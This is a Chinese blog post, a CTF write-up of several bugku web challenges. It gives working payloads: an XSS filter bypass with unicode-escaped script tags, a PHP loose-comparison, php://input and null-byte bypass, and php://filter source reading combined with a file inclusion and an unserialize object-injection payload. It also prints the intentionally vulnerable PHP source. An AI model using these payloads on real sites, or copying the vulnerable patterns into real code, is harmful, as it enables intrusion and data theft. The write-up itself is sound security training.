---
layout: post
title: "bugku ctf writeup2"
date: 2018-03-08 22：40
categories: jekyll update
---

## 前言
&emsp;&emsp;这篇开始bugku高级篇。。。

## Web
### XSS注入测试
&emsp;&emsp;题目描述：
>1、请注入一段XSS代码，获取Flag值
>2、必须包含alert(_key_)，_key_会自动被替换

&emsp;&emsp;随便测试了一下，发现会对字符进行实体编码。
<div align="center">
    <img src="/images/posts/bugku/29.png" >  
</div>
&emsp;&emsp;注意到页面是utf-8编码，id传入代码会在s中运行，考虑将<>进行unicode编码，这样当代码被替换进去运行时，utf-8编码又会将其变回来
&emsp;&emsp;所以payload：`?id=\u003cscript\u003ealert(_key_)\u003c/script\u003e`，访问后查看源代码即可得到flag。

### never give up
&emsp;&emsp;查看题目的源代码如下：
<div align="center">
    <img src="/images/posts/bugku/30.png" >  
</div>
&emsp;&emsp;访问`1p.html`，注意是在查看源代码的地方访问，然后可以发现加密了的字符串。
<div align="center">
    <img src="/images/posts/bugku/31.png" >  
</div>
&emsp;&emsp;拿去解密，这里不累赘。直接放出源代码：
```php
if(!$_GET['id'])
{
    header('Location: hello.php?id=1');
    exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
    echo 'no no no no no no no';
    return ;
}
$data = @file_get_contents($a,'r');
if($data=="bugku is a nice plateform!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
    require("f4l2a3g.txt");
}
else
{
    print "never never never give up !!!";
}
?>
```
&emsp;&emsp;可以看到flag文件已经暴露出来，直接访问也可以拿到flag。但这里介绍绕过检测拿到flag的方法。可以看到满足拿flag的条件有三个：
* **一：id**

&emsp;&emsp;&emsp;&emsp;id既要不等于0（`if(!$_GET['id'])`），又要等于0（`$id==0`）。所以这里我们要利用php的松散性，`字符串跟0比较（==）是成立的`，所以payload：`"aaa" == 0`
* **二：php伪协议**

&emsp;&emsp;&emsp;&emsp;`$data = @file_get_contents($a,'r');`的存在可以使用`php://input`在绕过，所以：`a=php://input`，然后在`post`bugku is a nice plateform!。
* **三：字符截断**

* &emsp;&emsp;&emsp;&emsp;假设：
```php
$b = "%0012345"
substr($b,0,1)  --> 将返回空（null）
strlen($b)>5  --> 是成立的
```

&emsp;&emsp;所以最终的payload：`?id=aaa&a=php://input&b=%00abcde`。
<div align="center">
    <img src="/images/posts/bugku/32.png" >  
</div>

### never give up
&emsp;&emsp;查看网页源代码可以发现存在`源码泄露`漏洞。
<div align="center">
    <img src="/images/posts/bugku/33.png" >  
</div>
&emsp;&emsp;使用`php伪协议：php://input，php://filter`可以读取index.php和hint.php的base64源码。
<div align="center">
    <img src="/images/posts/bugku/34.png" >  
</div>
&emsp;&emsp;这里直接贴解密后的代码。
**index.php**
```php
<?php  
$txt = $_GET["txt"];  
$file = $_GET["file"];  
$password = $_GET["password"];  
  
if(isset($txt)&&(file_get_contents($txt,'r')==="welcome to the bugkuctf")){  
    echo "hello friend!<br>";  
    if(preg_match("/flag/",$file)){ 
        echo "不能现在就给你flag哦";
        exit();  
    }else{  
        include($file);   
        $password = unserialize($password);  
        echo $password;  
    }  
}else{  
    echo "you are not the number of bugku ! ";  
}  
?> 
```
**hint.php**
```php
<?php  
  
class Flag{//flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("good");
        }  
    }  
}  
?>  
```
&emsp;&emsp;从`$password = unserialize($password);`中很明显可以看到是`反序列化漏洞`，所以构造读取flag的payload：`O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}`。

&emsp;&emsp;所以最终的payload为：
<div align="center">
    <img src="/images/posts/bugku/35.png" width="70%" />  
</div>
&emsp;&emsp;这里要注意的是`file=hint.php`，因为要利用php对象反序列化要`先声明对象`，所以要将hint.php包含进来。

&emsp;&emsp;总的来说，这道题的考察点算是比较多的，包括：php伪协议、文件包含、php反序列化，所以质量还是可以的。
&emsp;&emsp;
&emsp;&emsp;
&emsp;&emsp;